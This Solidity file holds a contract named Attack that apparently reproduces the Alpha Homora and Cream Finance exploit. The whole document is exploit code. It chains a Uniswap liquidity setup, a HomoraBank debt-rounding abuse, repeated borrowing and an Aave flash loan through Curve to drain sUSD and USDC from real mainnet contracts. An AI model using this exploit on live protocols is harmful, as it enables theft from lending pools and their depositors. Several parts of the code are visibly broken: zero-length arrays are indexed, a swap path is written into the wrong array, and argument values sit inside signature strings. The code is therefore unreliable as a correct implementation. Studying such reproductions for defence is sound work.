// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./interface/IHomoraBank.sol";
import "./interface/IUniswapRouter.sol";
import "./interface/IUniswapV2Pair.sol";
import "./interface/IIronBank.sol";
import "./interface/ICurve.sol";

import "./interface/IERC20.sol";
import "./interface/IWERC20.sol";
import "./interface/CERC20.sol";

import "./interface/IAAVE.sol";

import "hardhat/console.sol";

contract Attack {
    IHomoraBank public homorabank;
    IUniswapRouter public uniSwapRouter;
    IUniswapV2Pair public uniswapPair;
    IIronBank public ironBank;

    ICurve public curve;
    address public curve_aDAI_Pool;

    address public wETH;

    IAAVE public aaveLendingPoolV2;
    IWERC20 public werc20;

    IERC20 public uni;
    IERC20 public usdc;
    IERC20 public sUSD;
    IERC20 public dai;
    IERC20 public usdt;

    CERC20 public cySUSD;
    CERC20 public cyUSDC;

    /* 
        cream finance comptroller = 0xAB1c342C7bf5Ec5F02ADEA1c2270670bCa144CbB
        cToken implementation = 0x2aC63723a576f89b628D514Ff671300801dc1702
     */

    constructor() {
        homorabank = IHomoraBank(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);
        uniSwapRouter = IUniswapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapPair = IUniswapV2Pair(
            0xd3d2E2692501A5c9Ca623199D38826e513033a17
        );
        ironBank = IIronBank(0xAB1c342C7bf5Ec5F02ADEA1c2270670bCa144CbB); // cream finance comptroller

        curve_aDAI_Pool = 0xDeBF20617708857ebe4F679508E7b7863a8A8EeE;
        aaveLendingPoolV2 = IAAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

        wETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

        curve = ICurve(0xA5407eAE9Ba41422680e2e00537571bcC53efBfD);
        werc20 = IWERC20(0xe28D9dF7718b0b5Ba69E01073fE82254a9eD2F98);

        uni = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        sUSD = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
        dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

        cySUSD = CERC20(0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8);
        cyUSDC = CERC20(0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c);
    }

    // send 1.5 ETH to call this func
    function attack2() external payable {
        // using uniswap to swap
        // uniswap router address = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d，value = 0.5 ETH
        address[] memory tokens = new address[](2);
        tokens[0] = address(wETH);
        tokens[1] = address(uni);

        uniSwapRouter.swapExactETHForTokens{value: 500000000000000000}(
            1,
            tokens,
            address(this),
            1613195981
        );

        // approve uniswap router
        uni.approve(address(uniSwapRouter), type(uint256).max);
        uni.balanceOf(address(this));

        // add liquidity
        // function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline)
        // generate 2.265302 LP token
        uniSwapRouter.addLiquidityETH{value: 500000000000000000}(
            address(uni),
            39956169435440238768,
            1,
            1,
            address(this),
            1613195981
        );

        // enter markets in creamFinance
        /* 
            cySUSD = 0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8 
            cyDai = 0x8e595470Ed749b85C6F7669de83EAe304C2ec68F
            cyWETH = 0x41c84c0e2ee0b740cf0d31f63f3b6f627dc6b393
            cyUSDT = 0x48759F220ED983dB51fA7A8C0D2AAb8f3ce4166a
            cyUSDC = 0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c
        */
        address[] memory enterTokens = new address[](5);
        enterTokens[0] = 0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8;
        enterTokens[1] = 0x8e595470Ed749b85C6F7669de83EAe304C2ec68F;
        enterTokens[2] = 0x41c84c0e2EE0b740Cf0d31F63f3B6F627DC6b393;
        enterTokens[3] = 0x48759F220ED983dB51fA7A8C0D2AAb8f3ce4166a;
        enterTokens[4] = 0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c;

        ironBank.enterMarkets(enterTokens);

        // curve = 0xa5407eae9ba41422680e2e00537571bcc53efbfd
        usdc.approve(address(curve), type(uint256).max);
        sUSD.approve(address(curve), type(uint256).max);
        dai.approve(address(curve_aDAI_Pool), type(uint256).max);
        usdt.approve(address(curve_aDAI_Pool), type(uint256).max);

        usdc.approve(address(curve_aDAI_Pool), type(uint256).max);
        usdc.approve(address(aaveLendingPoolV2), type(uint256).max);
        sUSD.approve(address(cySUSD), type(uint256).max);
        sUSD.approve(address(homorabank), type(uint256).max);

        // swap ETH to sUSD， then have sUSD 912.639353999928927702
        address[] memory swapBackTokens = new address[](2);
        tokens[0] = address(uni);
        tokens[1] = address(wETH);
        uniSwapRouter.swapExactETHForTokens{value: 500000000000000000}(
            1,
            swapBackTokens,
            address(this),
            1613195981
        );

        uint256 amount = sUSD.balanceOf(address(this));

        // using sUSD to mint to get cySUSD
        // amount = 894.386566919930349147     差額：18 sUSD
        cySUSD.mint(amount - 18);
    }

    // nee to change 0x0a22ceaa the same as execute3_0x0a22ceaa function selector
    function attack3() external {
        bytes memory data = abi.encodeWithSignature(
            "execute3_0x0a22ceaa(uint256)",
            1000
        );
        homorabank.execute(0, address(this), data);
    }

    function execute3_0x0a22ceaa(uint256 _amount) external {
        // POSITION_ID = 883
        homorabank.POSITION_ID();

        // borrow sUSD from homerabank to get the share
        // 0x57ab1ec28d129707052df4df418d58a2d46d5f51 =  sUSD , amount = 1000000000000000000000
        homorabank.borrow(address(sUSD), 1000000000000000000000);

        //  = 2265302661394052593
        uint256 amount = uniswapPair.balanceOf(address(this));
        uniswapPair.approve(address(werc20), amount);

        // use UNISWAP lp token to mint erc1155
        werc20.mint(address(uniswapPair), amount);

        werc20.setApprovalForAll(address(homorabank), true);

        //function putCollateral(address collToken, uint256 collId, uint256 amountCall)
        homorabank.putCollateral(
            address(werc20), // WERC20
            1209299932290980665713177030673858520201944054295,
            amount
        );
        /* the result will be */
        // collateralETHValue = 670838658434707390
        // getBorrowETHValue =  635983092500686978
    }

    function attack4() external {
        bytes memory data = abi.encodeWithSignature("execute4_0xe3b2ca92()");
        homorabank.execute(883, address(this), data);
    }

    function execute4_0xe3b2ca92() external {
        // cal interest，token is sUSD
        homorabank.accrue(address(sUSD));

        // get debts，position id = 883
        // output: tokens[]，debts[1000000098548938710984], 1000.000098548938710984
        (address[] memory tokens, uint256[] memory debts) = homorabank
            .getPositionDebts(883);

        // repay sUSD but only 1000000098548938710983, but debt is 1000000098548938710984
        homorabank.repay(tokens[0], debts[0] - 1);

        /* the result will be */
        // collateralETHValue = 670838998176887290
        // getBorrowETHValue = 0 .
        // todo WHY? because repayInternal : paid.mul(totalShare).div(totalDebt)?
    }

    function attack5() external {
        homorabank.resolveReserve(address(sUSD));
    }

    function attack6() external {
        bytes memory data = abi.encodeWithSignature(
            "callback_0xf37425b4(uint256),16"
        );
        homorabank.execute(0, address(this), data);
    }

    // amoun = 16
    function callback_0xf37425b4(uint256 _time) external {
        /* 
            attack 6
            return (isListed=true, cToken=[cySUSD], reserve=19709787742196, totalDebt=19709787742197, totalShare=1)
            attack 7
            return (isListed=true, cToken=[cySUSD], reserve=19709787742196, totalDebt=1291700649474786895, totalShare=1)
         */
        (
            bool isList,
            address cToken,
            uint256 reserve,
            uint256 totalDebt,
            uint256 totalShare
        ) = homorabank.getBankInfo(address(sUSD));

        // attack 6 borrow 16 times, and deposit 19.54 sUSD to cySUSD
        // attack 7 borrow 10 times, and deposit 1321 sUSD to cySUSD
        for (uint256 i = 1; i <= _time; i++) {
            homorabank.borrow(address(sUSD), reserve * i);
        }

        uint256 amount = sUSD.balanceOf(address(this));
        cySUSD.mint(amount);
    }

    function attack7() external {
        // call back top func with time = 10
        bytes memory data = abi.encodeWithSignature(
            "callback_0xf37425b4(uint256),10"
        );
        homorabank.execute(0, address(this), data);
    }

    function attack8() external {
        bytes memory data = abi.encodeWithSignature(
            "callback_0x7c2c889b(uint256, uint256)",
            10,
            1800000000000
        );

        homorabank.execute(0, address(this), data);

        // when finish all
        /* 
            getCollateralETHValue = 0
            getBorrowETHValue = 0
         */
    }

    // cast callback
    /* 
        0x7c2c889b
        000000000000000000000000000000000000000000000000000000000000000a
        000000000000000000000000000000000000000000000000000001a3185c5000  // 1800000000000
     */

    function callback_0x7c2c889b(uint256 _x, uint256 _amount) external {
        address[] memory assets = new address[](1);
        assets[0] = address(usdc);

        uint256[] memory amounts = new uint256[](0);
        amounts[0] = _amount;

        uint256[] memory modes = new uint256[](0);
        modes[0] = 0;

        bytes memory params = abi.encode(0);

        // loan USDC
        // will call back executeOperation()
        aaveLendingPoolV2.flashLoan(
            address(this),
            assets,
            amounts, // 1800000000000 USDC
            modes,
            address(this),
            params,
            0
        );
    }

    // AAVE flashloan call back
    // function selector = 0x920f5c84
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external {
        //  on curve to exchange from usdc = 1800000 to get sUSD = 1,770,757.56254472419047906
        // 	exchange(int128,int128,uint256,uint256)
        /* 
            0x3df02124
            0000000000000000000000000000000000000000000000000000000000000001
            0000000000000000000000000000000000000000000000000000000000000003
            000000000000000000000000000000000000000000000000000001a3185c5000
            0000000000000000000000000000000000000000000000000000000000000000
         */
        curve.exchange(1, 3, amounts[0], 0);

        uint256 amount = sUSD.balanceOf(address(this));
        // use sUSD = 1770757562544724190479060 to get cySUSD = 176,732,838.7823772
        cySUSD.mint(amount);

        /* 
            loop 1 getBankInfo result:
            isListed = true
            cToken = 0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8
            reserve = 19709787742196
            totalDebt = 1322701465183807241364
            totalshare = 1
        */
        homorabank.getBankInfo(address(sUSD));
        sUSD.balanceOf(address(cySUSD)); // 1,773,718.663234649254776192

        for (uint256 i = 1; i <= 10; i++) {
            // throught homorabank to borrow from cream finance to this contract
            homorabank.borrow(address(sUSD), 1322701465183807241363 * i);
            sUSD.balanceOf(address(cySUSD)); // become less and less, and final become 1353123598883034807914349
        }

        // change from sUSD = 1,353,123.598883034807914349 to USDC = 1,374,960.726754
        uint256 newAmount = sUSD.balanceOf(address(this));
        curve.exchange(3, 1, newAmount, 0);

        if (newAmount < 1800000000000 + (1800000000000 * 9) / 10000) {
            uint256 AAVEFee = (1800000000000 * 9) / 10000; // USDC
            uint256 shortAmount = 1800000000000 + AAVEFee - newAmount; // USDC
            // borrow 426,659.273246 USDC from CYUSDC
            cyUSDC.borrow(shortAmount);
        }

        // so total will have 1801620( 1,374,960.726754 + 426,659.273246) USDC to repay the flashloan
    }

    function attack9() external {
        bytes memory data = abi.encodeWithSignature(
            "callback_0x7c2c889b(uint256, uint256)",
            7,
            10000000000000
        );

        // will call back below callback_0x7c2c889b()
        homorabank.execute(0, address(this), data);
    }
}